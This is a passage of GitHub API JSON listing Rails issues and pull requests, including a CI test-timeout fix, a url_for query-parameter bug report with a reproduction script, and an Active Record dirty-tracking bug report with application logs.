    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51148",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51148/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51148/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51148/events",
        "html_url": "https://github.com/rails/rails/pull/51148",
        "id": 2145483303,
        "node_id": "PR_kwDNIULOZ3RhhQ",
        "number": 51148,
        "title": "Increase assert_output timeout for `FullStackConsoleTest` and `ApplicationTests::ServerTest`",
        "user": {
            "login": "yahonda",
            "id": 73684,
            "node_id": "MDQ6VXNlcjczNjg0",
            "avatar_url": "https://avatars.githubusercontent.com/u/73684?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/yahonda",
            "html_url": "https://github.com/yahonda",
            "followers_url": "https://api.github.com/users/yahonda/followers",
            "following_url": "https://api.github.com/users/yahonda/following{/other_user}",
            "gists_url": "https://api.github.com/users/yahonda/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/yahonda/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/yahonda/subscriptions",
            "organizations_url": "https://api.github.com/users/yahonda/orgs",
            "repos_url": "https://api.github.com/users/yahonda/repos",
            "events_url": "https://api.github.com/users/yahonda/events{/privacy}",
            "received_events_url": "https://api.github.com/users/yahonda/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-20T23:51:36Z",
        "updated_at": "2024-02-21T00:00:31Z",
        "closed_at": "2024-02-21T00:00:31Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51148",
            "html_url": "https://github.com/rails/rails/pull/51148",
            "diff_url": "https://github.com/rails/rails/pull/51148.diff",
            "patch_url": "https://github.com/rails/rails/pull/51148.patch",
            "merged_at": "2024-02-21T00:00:31Z"
        },
        "body": "### Motivation / Background\r\n\r\nThis pull request addresses the following failures at Rails Nightly CI with assertion enabled Ruby. that has been built with `cppflags=\"-DENABLE_PATH_CHECK=0 -DRUBY_DEBUG=1\" optflags=\"-O3 -fno-inline\"`\r\n\r\nhttps://buildkite.com/rails/rails-nightly/builds/191#018dc3d1-9032-4baa-ae8a-3c630889ab5f/1342-1348 https://buildkite.com/rails/rails-nightly/builds/191#018dc3d1-9033-4c0c-b61c-00f26d3a63fb/1198-1204\r\n\r\nRelated to #51140\r\n\r\n### Detail\r\n- Failures fixed by this commit:\r\n\r\n```ruby\r\n$ ruby -v\r\nruby 3.4.0dev (2024-02-20T11:52:09Z master c22cb960cf) [x86_64-linux]\r\n$ bin/test test/application/console_test.rb -n test_sandbox\r\nRun options: -n test_sandbox --seed 3666\r\n\r\nF\r\n\r\nFailure:\r\nFullStackConsoleTest#test_sandbox [test/console_helpers.rb:19]:\r\n\"=> 0\" expected, but got:\r\n\r\napp-template(dev)> quapp-template(dev)> quiapp-template(dev)> quit.\r\nExpected \"\\r\\napp-template(dev)> quapp-template(dev)> quiapp-template(dev)> quit\" to include \"=> 0\".\r\n\r\nbin/test test/application/console_test.rb:142\r\n\r\nFinished in 32.180314s, 0.0311 runs/s, 0.7458 assertions/s.\r\n1 runs, 24 assertions, 1 failures, 0 errors, 0 skips\r\n$\r\n```\r\n\r\n```ruby\r\n$ bin/test test/application/server_test.rb\r\nRun options: --seed 64559\r\n\r\nF\r\n\r\nFailure:\r\nApplicationTests::ServerTest#test_restart_rails_server_with_custom_pid_file_path [test/console_helpers.rb:19]:\r\n\"Listening\" expected, but got:\r\n\r\n.\r\nExpected \"\" to include \"Listening\".\r\n\r\nbin/test test/application/server_test.rb:19\r\n\r\nF\r\n\r\nFailure:\r\nApplicationTests::ServerTest#test_run_+server+_blocks_after_the_server_starts [test/console_helpers.rb:19]:\r\n\"Hello world\" expected, but got:\r\n\r\n.\r\nExpected \"\" to include \"Hello world\".\r\n\r\nbin/test test/application/server_test.rb:43\r\n\r\nFinished in 2.117413s, 0.9445 runs/s, 1.8891 assertions/s.\r\n2 runs, 4 assertions, 2 failures, 0 errors, 0 skips\r\n$\r\n```\r\n\r\n### Additional information\r\n\r\nNote: These failures depend on assert_timeout and test environment. If these failures do not reproduce locally, setting short timeout = 1 should reproduce them.\r\n```diff\r\n$ git diff\r\ndiff --git a/railties/test/console_helpers.rb b/railties/test/console_helpers.rb\r\nindex 10d3a54602..32d333ed99 100644\r\n--- a/railties/test/console_helpers.rb\r\n+++ b/railties/test/console_helpers.rb\r\n@@ -6,7 +6,7 @@\r\n end\r\n\r\n module ConsoleHelpers\r\n-  def assert_output(expected, io, timeout = 10)\r\n+  def assert_output(expected, io, timeout = 1)\r\n     timeout = Time.now + timeout\r\n\r\n     output = +\"\"\r\n$\r\n```\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [ ] Tests are added or updated if you fix a bug or add a feature.\r\n* [ ] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51148/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51148/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51147",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51147/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51147/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51147/events",
        "html_url": "https://github.com/rails/rails/issues/51147",
        "id": 2145394303,
        "node_id": "I_kwDNIULOf-Aefw",
        "number": 51147,
        "title": "url_for helper incorrectly combines query parameters on routes with a default parameter",
        "user": {
            "login": "DanielHeath",
            "id": 47430,
            "node_id": "MDQ6VXNlcjQ3NDMw",
            "avatar_url": "https://avatars.githubusercontent.com/u/47430?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/DanielHeath",
            "html_url": "https://github.com/DanielHeath",
            "followers_url": "https://api.github.com/users/DanielHeath/followers",
            "following_url": "https://api.github.com/users/DanielHeath/following{/other_user}",
            "gists_url": "https://api.github.com/users/DanielHeath/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/DanielHeath/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/DanielHeath/subscriptions",
            "organizations_url": "https://api.github.com/users/DanielHeath/orgs",
            "repos_url": "https://api.github.com/users/DanielHeath/repos",
            "events_url": "https://api.github.com/users/DanielHeath/events{/privacy}",
            "received_events_url": "https://api.github.com/users/DanielHeath/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 3,
        "created_at": "2024-02-20T22:24:40Z",
        "updated_at": "2024-02-20T23:45:04Z",
        "closed_at": "2024-02-20T23:08:18Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\n\r\nDefine a route with a query parameter in the route.\r\nCall url_for to generate that route, providing additional query parameters.\r\n\r\n```ruby# frozen_string_literal: true\r\n\r\nrequire \"bundler/inline\"\r\n\r\ngemfile(true) do\r\n  source \"https://rubygems.org\"\r\n  gem \"rails\"\r\nend\r\n\r\nrequire \"action_controller/railtie\"\r\n\r\nclass TestApp < Rails::Application\r\n  config.root = __dir__\r\n  config.hosts << \"example.org\"\r\n  config.secret_key_base = \"secret_key_base\"\r\n\r\n  config.logger = Logger.new($stdout)\r\n  Rails.logger  = config.logger\r\n\r\n  routes.draw do\r\n    get \"/foo?bar=baz\" => \"test#index\", as: :foo\r\n  end\r\nend\r\n\r\nrequire \"minitest/autorun\"\r\nrequire \"rack/test\"\r\n\r\nclass BugTest < Minitest::Test\r\n  include Rack::Test::Methods\r\n\r\n  def test_returns_success\r\n    assert_equal url_helpers.foo_path(query: :param), \"/foo?bar=baz&query=param\"\r\n  end\r\n\r\n  private\r\n    def url_helpers\r\n      Rails.application.routes.url_helpers\r\n    end\r\nend\r\n```\r\n\r\n### Expected behavior\r\nThe additional URL parameters should be added using an `&`\r\n\r\n### Actual behavior\r\nThe additional URL parameters are added using an `?`\r\n\r\n### System configuration\r\n**Rails version**: 7.1.3\r\n\r\n**Ruby version**: 3.2.2\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51147/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51147/timeline",
        "performed_via_github_app": null,
        "state_reason": "not_planned"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51146",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51146/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51146/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51146/events",
        "html_url": "https://github.com/rails/rails/pull/51146",
        "id": 2145377018,
        "node_id": "PR_kwDNIULOZ3LtOg",
        "number": 51146,
        "title": "Remove all deprecated code from Active Record",
        "user": {
            "login": "rafaelfranca",
            "id": 47848,
            "node_id": "MDQ6VXNlcjQ3ODQ4",
            "avatar_url": "https://avatars.githubusercontent.com/u/47848?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/rafaelfranca",
            "html_url": "https://github.com/rafaelfranca",
            "followers_url": "https://api.github.com/users/rafaelfranca/followers",
            "following_url": "https://api.github.com/users/rafaelfranca/following{/other_user}",
            "gists_url": "https://api.github.com/users/rafaelfranca/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/rafaelfranca/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/rafaelfranca/subscriptions",
            "organizations_url": "https://api.github.com/users/rafaelfranca/orgs",
            "repos_url": "https://api.github.com/users/rafaelfranca/repos",
            "events_url": "https://api.github.com/users/rafaelfranca/events{/privacy}",
            "received_events_url": "https://api.github.com/users/rafaelfranca/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-20T22:10:22Z",
        "updated_at": "2024-02-20T22:17:01Z",
        "closed_at": "2024-02-20T22:17:01Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51146",
            "html_url": "https://github.com/rails/rails/pull/51146",
            "diff_url": "https://github.com/rails/rails/pull/51146.diff",
            "patch_url": "https://github.com/rails/rails/pull/51146.patch",
            "merged_at": "2024-02-20T22:17:01Z"
        },
        "body": "Part of #49624",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51146/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51146/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51145",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51145/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51145/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51145/events",
        "html_url": "https://github.com/rails/rails/pull/51145",
        "id": 2145185514,
        "node_id": "PR_kwDNIULOZ3BN-A",
        "number": 51145,
        "title": "Fix typos [ci skip]",
        "user": {
            "login": "biow0lf",
            "id": 93578,
            "node_id": "MDQ6VXNlcjkzNTc4",
            "avatar_url": "https://avatars.githubusercontent.com/u/93578?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/biow0lf",
            "html_url": "https://github.com/biow0lf",
            "followers_url": "https://api.github.com/users/biow0lf/followers",
            "following_url": "https://api.github.com/users/biow0lf/following{/other_user}",
            "gists_url": "https://api.github.com/users/biow0lf/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/biow0lf/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/biow0lf/subscriptions",
            "organizations_url": "https://api.github.com/users/biow0lf/orgs",
            "repos_url": "https://api.github.com/users/biow0lf/repos",
            "events_url": "https://api.github.com/users/biow0lf/events{/privacy}",
            "received_events_url": "https://api.github.com/users/biow0lf/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 1174770998,
                "node_id": "MDU6TGFiZWwxMTc0NzcwOTk4",
                "url": "https://api.github.com/repos/rails/rails/labels/actionmailbox",
                "name": "actionmailbox",
                "color": "f4a6cb",
                "default": false,
                "description": ""
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-20T20:11:25Z",
        "updated_at": "2024-02-20T21:01:24Z",
        "closed_at": "2024-02-20T20:16:29Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51145",
            "html_url": "https://github.com/rails/rails/pull/51145",
            "diff_url": "https://github.com/rails/rails/pull/51145.diff",
            "patch_url": "https://github.com/rails/rails/pull/51145.patch",
            "merged_at": "2024-02-20T20:16:29Z"
        },
        "body": "* [x] This Pull Request is related to one change.\r\n* [x] Commit message has a detailed description of what changed and why.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51145/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51145/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51144",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51144/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51144/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51144/events",
        "html_url": "https://github.com/rails/rails/issues/51144",
        "id": 2145068187,
        "node_id": "I_kwDNIULOf9skmw",
        "number": 51144,
        "title": "Setter sometimes doesn't update the changes, and therefore, doesn't save later on.",
        "user": {
            "login": "GeoffreyOnRails",
            "id": 4128473,
            "node_id": "MDQ6VXNlcjQxMjg0NzM=",
            "avatar_url": "https://avatars.githubusercontent.com/u/4128473?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/GeoffreyOnRails",
            "html_url": "https://github.com/GeoffreyOnRails",
            "followers_url": "https://api.github.com/users/GeoffreyOnRails/followers",
            "following_url": "https://api.github.com/users/GeoffreyOnRails/following{/other_user}",
            "gists_url": "https://api.github.com/users/GeoffreyOnRails/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/GeoffreyOnRails/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/GeoffreyOnRails/subscriptions",
            "organizations_url": "https://api.github.com/users/GeoffreyOnRails/orgs",
            "repos_url": "https://api.github.com/users/GeoffreyOnRails/repos",
            "events_url": "https://api.github.com/users/GeoffreyOnRails/events{/privacy}",
            "received_events_url": "https://api.github.com/users/GeoffreyOnRails/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 4,
        "created_at": "2024-02-20T18:56:52Z",
        "updated_at": "2024-02-27T01:58:41Z",
        "closed_at": null,
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\n\r\nHere is an issue that appears some times in one of our job, but that we don't manage to reproduce consistently. \r\nThe assign_attributes, sometimes, does change my object values, but doesn't mark them as changed, and therefore won't be saved when I do a save! (no UPDATE SQL query sent). \r\n\r\n\r\n\r\n```ruby\r\nclass ExamReservation < ApplicationRecord\r\n  belongs_to :selected_exam_center, class_name: \"Location\"\r\n  # I removed all the stuff not related. There are a few callbacks, but nothing that should be related\r\n  \r\n  def my_flacky_method(some_params)\r\n       # Initialize needed variables from some_params\r\n      logger.warn(\"[DEBUG][my_method] Exam_reservation #{to_param}, before assign_attributes : object -> #{inspect}, object valid? -> #{valid?}, errors -> #{errors.full_messages}, changes -> #{changes}\")\r\n    assign_attributes(\r\n      driving_exam_starts_at: starts_at, # Date\r\n      status: Status::DRIVING_EXAM_BOOKED, #string\r\n      comment: comment, #nil or string\r\n      selected_exam_center: exam_center, #Location object\r\n      automatic_booking: true\r\n    )\r\n    logger.warn(\"[DEBUG][my_method] Exam_reservation #{to_param}, before save - after assign_attributes : object -> #{inspect}, object valid? -> #{valid?}, errors -> #{errors.full_messages}, changes -> #{changes}\")\r\n    save!(validate: false)\r\n    logger.warn(\"[DEBUG][my_method] Exam_reservation #{to_param}, after save : object -> #{inspect}, object valid? -> #{valid?}, errors -> #{errors.full_messages}, changes -> #{changes}\")\r\n  end\r\n  reload\r\n  logger.warn(\"[DEBUG][my_method] Error on #{to_param} after save : #{inspect}\")\r\n  end\r\n```\r\n\r\n\r\n### Expected behavior\r\nWe would expect in our logs the object to have value modified, and the changes method to contain the values modified by the assign_attributes\r\n\r\n### Actual behavior\r\nWe **DO have the fields modified** in our object according to the logs (status, selected_exam_center_id...), **however we have an empty value** returned by the `changes` method, and therefore the save!(validate: false) does nothing.\r\nThis behavior happens only sometimes though, even for the same object (doing it again with the same parameters sometimes passes. \r\n\r\n```\r\nFeb 20 12:49:47   W, [2024-02-20T11:49:47+00:002]  WARN -- ** BOOKING **: [DEBUG][my_method] Exam_reservation 6546388859, before assign_attributes : object -> #<ExamReservation id: 31493, student_id: 2216054, teacher_id: 1879574, training_end_date: \"2024-01-11\", inscription_date: \"2024-01-11\", priority_score: 80, status: \"examen  planifier\", driving_exam_starts_at: nil, urgent_driving_exam: false, teacher_comment: nil, created_at: \"2024-01-11 19:26:06.618382000 +0100\", updated_at: \"2024-02-20 02:30:31.286590000 +0100\", deadline: nil, bonus: [], comment: \"Aucun crneau disponible pour linstant, pour cett...\", penalty_end_date: nil, selected_exam_center_id: nil, comment_updated_at: \"2024-02-20 12:48:00.983422000 +0100\", credits: nil, credits_consumed_at: \"2024-02-19 09:54:49.217572000 +0100\", reminder_mandate_sent_at: nil, automatic: false, reminder_credits_sent_at: nil, convocation_reminder_sent_at: nil>, object valid? -> true, errors -> [], changes -> {}\r\n\r\nFeb 20 12:49:47   W, [2024-02-20T11:49:47+00:002]  WARN -- ** BOOKING **: [DEBUG][my_method] Exam_reservation 6546388859, before save - after assign_attributes : object -> #<ExamReservation id: 31493, student_id: 2216054, teacher_id: 1879574, training_end_date: \"2024-01-11\", inscription_date: \"2024-01-11\", priority_score: 80, status: \"examen rserv\", driving_exam_starts_at: \"2024-03-06 09:00:00.000000000 +0100\", urgent_driving_exam: false, teacher_comment: nil, created_at: \"2024-01-11 19:26:06.618382000 +0100\", updated_at: \"2024-02-20 02:30:31.286590000 +0100\", deadline: nil, bonus: [], comment: nil, penalty_end_date: nil, selected_exam_center_id: 277, comment_updated_at: \"2024-02-20 12:48:00.983422000 +0100\", credits: nil, credits_consumed_at: \"2024-02-19 09:54:49.217572000 +0100\", reminder_mandate_sent_at: nil, automatic: false, reminder_credits_sent_at: nil, convocation_reminder_sent_at: nil>, object valid? -> true, errors -> [], changes -> {}\r\n\r\nFeb 20 12:49:47   W, [2024-02-20T11:49:47+00:002]  WARN -- ** BOOKING **: [DEBUG][my_method] Exam_reservation  6546388859, after save : object -> #<ExamReservation id: 31493, student_id: 2216054, teacher_id: 1879574, training_end_date: \"2024-01-11\", inscription_date: \"2024-01-11\", priority_score: 80, status: \"examen rserv\", driving_exam_starts_at: \"2024-03-06 09:00:00.000000000 +0100\", urgent_driving_exam: false, teacher_comment: nil, created_at: \"2024-01-11 19:26:06.618382000 +0100\", updated_at: \"2024-02-20 02:30:31.286590000 +0100\", deadline: nil, bonus: [], comment: nil, penalty_end_date: nil, selected_exam_center_id: 277, comment_updated_at: \"2024-02-20 12:48:00.983422000 +0100\", credits: nil, credits_consumed_at: \"2024-02-19 09:54:49.217572000 +0100\", reminder_mandate_sent_at: nil, automatic: false, reminder_credits_sent_at: nil, convocation_reminder_sent_at: nil>, object valid? -> true, errors -> [], changes -> {}\r\n\r\nFeb 20 12:49:47   D, [2024-02-20T11:49:47+00:002] DEBUG -- ** BOOKING **:   ExamReservation Load (1.3ms)  SELECT \"exam_reservations\".* FROM \"exam_reservations\" WHERE \"exam_reservations\".\"id\" = 31493 LIMIT 1\r\n\r\nFeb 20 12:49:48   W, [2024-02-20T11:49:48+00:002]  WARN -- ** BOOKING **: [DEBUG][apply_booking] Error on 6546388859 after save : -> #<ExamReservation id: 31493, student_id: 2216054, teacher_id: 1879574, training_end_date: \"2024-01-11\", inscription_date: \"2024-01-11\", priority_score: 80, status: \"examen  planifier\", driving_exam_starts_at: nil, urgent_driving_exam: false, teacher_comment: nil, created_at: \"2024-01-11 19:26:06.618382000 +0100\", updated_at: \"2024-02-20 02:30:31.286590000 +0100\", deadline: nil, bonus: [], comment: \"Aucun crneau disponible pour linstant, pour cett...\", penalty_end_date: nil, selected_exam_center_id: nil, comment_updated_at: \"2024-02-20 12:48:00.983422000 +0100\", credits: nil, credits_consumed_at: \"2024-02-19 09:54:49.217572000 +0100\", reminder_mandate_sent_at: nil, automatic: false, reminder_credits_sent_at: nil, convocation_reminder_sent_at: nil>\r\n```\r\n\r\n### System configuration\r\n**Rails version**: 6.1.7.4\r\n\r\n**Ruby version**: 3.1.0\r\n\r\nNote : we didn't override the setter / getter method anywhere else. \r\n```ruby\r\n> er = ExamReservation.find ...\r\n> method = er.method(:status=)\r\n=> #<Method: ExamReservation(id: integer, student_id: integer, teacher_id: integer, training_end_date: date, inscription_date: date, priority_score: integer, status: string, driving_exam_starts_at: datetime, urgent_driving_exam: boolean, teacher_comment: text, created_at: datetime, updated_at: datetime, deadline: date, bonus: jsonb, comment: string, penalty_end_date: date, selected_exam_center_id: integer, comment_updated_at: datetime, credits: integer, credits_consumed_at: datetime, reminder_mandate_sent_at: datetime, automatic: boolean, reminder_credits_sent_at: datetime, convocation_reminder_sent_at: datetime)(ExamReservation::GeneratedAttributeMethods)#status=(value) /app/vendor/bundle/ruby/3.1.0/gems/activemodel-6.1.7.4/lib/active_model/attribute_methods.rb:254>       \r\n> method.super_method\r\n=> nil\r\n> er.method(:selected_exam_center)\r\n=> #<Method: ExamReservation(id: integer, student_id: integer, teacher_id: integer, training_end_date: date, inscription_date: date, priority_score: integer, status: string, driving_exam_starts_at: datetime, urgent_driving_exam: boolean, teacher_comment: text, created_at: datetime, updated_at: datetime, deadline: date, bonus: jsonb, comment: string, penalty_end_date: date, selected_exam_center_id: integer, comment_updated_at: datetime, credits: integer, credits_consumed_at: datetime, reminder_mandate_sent_at: datetime, automatic: boolean, reminder_credits_sent_at: datetime, convocation_reminder_sent_at: datetime)(ExamReservation::GeneratedAssociationMethods)#selected_exam_center() /app/vendor/bundle/ruby/3.1.0/gems/activerecord-6.1.7.4/lib/active_record/associations/builder/association.rb:102>\r\n> er.method(:selected_exam_center=)\r\n=> #<Method: ExamReservation(id: integer, student_id: integer, teacher_id: integer, training_end_date: date, inscription_date: date, priority_score: integer, status: string, driving_exam_starts_at: datetime, urgent_driving_exam: boolean, teacher_comment: text, created_at: datetime, updated_at: datetime, deadline: date, bonus: jsonb, comment: string, penalty_end_date: date, selected_exam_center_id: integer, comment_updated_at: datetime, credits: integer, credits_consumed_at: datetime, reminder_mandate_sent_at: datetime, automatic: boolean, reminder_credits_sent_at: datetime, convocation_reminder_sent_at: datetime)(ExamReservation::GeneratedAssociationMethods)#selected_exam_center=(value) /app/vendor/bundle/ruby/3.1.0/gems/activerecord-6.1.7.4/lib/active_record/associations/builder/association.rb:110>                                  \r\n > er.method(:selected_exam_center=).super_method\r\nnil\r\n```\r\n\r\nI know that I don't have something to reproduce, but the bug happens from time to time, feel free to ask any more data that could help clarify the bug.\r\n\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51144/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51144/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51143",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51143/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51143/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51143/events",
        "html_url": "https://github.com/rails/rails/pull/51143",
        "id": 2144879876,
        "node_id": "PR_kwDNIULOZ2wTQQ",
        "number": 51143,
        "title": "Fix predicate builder for polymorphic models referencing models with composite primary keys",
        "user": {
            "login": "fatkodima",
            "id": 5657035,
            "node_id": "MDQ6VXNlcjU2NTcwMzU=",
            "avatar_url": "https://avatars.githubusercontent.com/u/5657035?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/fatkodima",
            "html_url": "https://github.com/fatkodima",
            "followers_url": "https://api.github.com/users/fatkodima/followers",
            "following_url": "https://api.github.com/users/fatkodima/following{/other_user}",
            "gists_url": "https://api.github.com/users/fatkodima/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/fatkodima/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/fatkodima/subscriptions",
            "organizations_url": "https://api.github.com/users/fatkodima/orgs",
            "repos_url": "https://api.github.com/users/fatkodima/repos",
            "events_url": "https://api.github.com/users/fatkodima/events{/privacy}",
            "received_events_url": "https://api.github.com/users/fatkodima/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-20T17:15:30Z",
        "updated_at": "2024-02-20T18:58:52Z",
        "closed_at": "2024-02-20T17:44:11Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51143",
            "html_url": "https://github.com/rails/rails/pull/51143",
            "diff_url": "https://github.com/rails/rails/pull/51143.diff",
            "patch_url": "https://github.com/rails/rails/pull/51143.patch",
            "merged_at": "2024-02-20T17:44:11Z"
        },
        "body": "This is backport of #50319 to `7-1-stable`.\r\n\r\ncc @eileencodes ",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51143/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51143/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51142",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51142/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51142/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51142/events",
        "html_url": "https://github.com/rails/rails/pull/51142",
        "id": 2144453614,
        "node_id": "PR_kwDNIULOZ2YzLw",
        "number": 51142,
        "title": "Refactor BindParameterTest",
        "user": {
            "login": "casperisfine",
            "id": 19192189,
            "node_id": "MDQ6VXNlcjE5MTkyMTg5",
            "avatar_url": "https://avatars.githubusercontent.com/u/19192189?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/casperisfine",
            "html_url": "https://github.com/casperisfine",
            "followers_url": "https://api.github.com/users/casperisfine/followers",
            "following_url": "https://api.github.com/users/casperisfine/following{/other_user}",
            "gists_url": "https://api.github.com/users/casperisfine/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/casperisfine/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/casperisfine/subscriptions",
            "organizations_url": "https://api.github.com/users/casperisfine/orgs",
            "repos_url": "https://api.github.com/users/casperisfine/repos",
            "events_url": "https://api.github.com/users/casperisfine/events{/privacy}",
